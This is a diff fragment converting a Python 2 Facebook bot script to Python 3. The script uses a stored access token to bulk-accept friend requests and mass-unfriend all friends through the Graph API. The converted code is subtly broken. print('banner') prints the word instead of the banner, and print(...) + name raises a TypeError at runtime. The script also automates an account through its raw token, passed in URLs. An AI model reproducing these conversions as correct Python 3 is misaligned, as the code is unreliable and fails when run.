         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[!] Connection Error'
-            raw_input('\nPress Enter To Back ')
+            print ('\x1b[1;91m[!] Connection Error')
+            input('\nPress Enter To Back ')
             bot()
 
-    print 40 * '-'
-    print '[\xe2\x9c\x93] The Process Has Been Completed. '
-    raw_input('\nPress Enter To Back ')
+    print (40 * '-')
+    print ('[\xe2\x9c\x93] The Process Has Been Completed. ')
+    input('\nPress Enter To Back ')
     bot()
 
 
@@ -687,33 +690,33 @@ def accept():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '[!] Token Not Found'
+        print ('[!] Token Not Found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         os.system('python2 wasi.py')
 
     os.system('clear')
-    print banner
-    limit = raw_input('[+]\x1b[1;92m Enter Limit To Accept Requests : ')
+    print ('banner')
+    limit = input('[+]\x1b[1;92m Enter Limit To Accept Requests : ')
     r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
     teman = json.loads(r.text)
     if '[]' in str(teman['data']):
-        print 'No friend Request'
-        raw_input('Press Enter To Back ')
+        print ('No friend Request')
+        input('Press Enter To Back ')
         bot()
     wasii('[\xe2\x9c\x93] The Process Has Been Start')
-    print 40 * '-'
+    print (40 * '-')
     for i in teman['data']:
         gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
         a = json.loads(gas.text)
         if 'error' in str(a):
-            print '[!] [Failed] | ' + i['from']['name']
+            print ('[!] [Failed] | ') + i['from']['name']
         else:
-            print '[!] [Accepted] |  ' + i['from']['name']
+            print ('[!] [Accepted] |  ' )+ i['from']['name']
 
-    print 40 * '-'
-    print '[\xe2\x9c\x93] The Process Has Been Completed.'
-    raw_input('\nPress Enter To Back ')
+    print (40 * '-')
+    print ('[\xe2\x9c\x93] The Process Has Been Completed.')
+    input('\nPress Enter To Back ')
     bot()
 
 
@@ -722,16 +725,16 @@ def unfriend():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '[!] Token Not Found'
+        print ('[!] Token Not Found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         os.system('python2 wasi.py')
 
     os.system('clear')
-    print banner
+    print ('banner')
     wasii('[\xe2\x9c\x93] The Process Has Been Started.')
-    print '[\xe2\x9c\x93] Press CTRL Z to Stop Process.'
-    print 50 * '-'
+    print ('[\xe2\x9c\x93] Press CTRL Z to Stop Process.')
+    print (50 * '-')
     try:
         pek = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
         cok = json.loads(pek.text)
@@ -739,17 +742,17 @@ def unfriend():
             name = i['name']
             id = i['id']
             requests.delete('https://graph.facebook.com/me/friends?uid=' + id + '&access_token=' + toket)
-            print '[\xe2\x9c\x93]\x1b[1;92m [Unfriended] | ' + name
+            print ('[\xe2\x9c\x93]\x1b[1;92m [Unfriended] | ') + name
 
     except IndexError:
         pass
     except KeyboardInterrupt:
-        print '[!]The Process Has Been Stopped'
-        raw_input('\n Press Enter To Back ')
+        print ('[!]The Process Has Been Stopped')
+        input('\n Press Enter To Back ')
         bot()
 
-    print '[\xe2\x9c\x93] The Process Has Been Completed.'
-    raw_input('Press Enter To Back ')
+    print ('[\xe2\x9c\x93] The Process Has Been Completed.')
+    input('Press Enter To Back ')
     bot()
 
 
